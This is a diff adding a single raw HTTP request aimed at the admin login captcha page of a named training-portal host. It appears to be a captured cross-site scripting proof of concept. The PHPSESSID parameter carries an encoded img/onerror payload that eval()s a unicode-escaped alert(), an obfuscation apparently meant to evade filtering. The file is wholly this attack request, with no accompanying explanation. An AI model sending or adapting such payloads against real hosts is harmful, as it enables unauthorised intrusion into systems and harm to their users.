@@ -1,0 +1,15 @@
+GET /login_captcha.php?PHPSESSID=%3Cimg%20src=x%20onerror=%22eval(%27\u0061\u006c\u0065\u0072\u0074\u0028\u0029%27)%22%3E HTTP/2
+Host: admin.ls.traininghub.m-pesa.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+
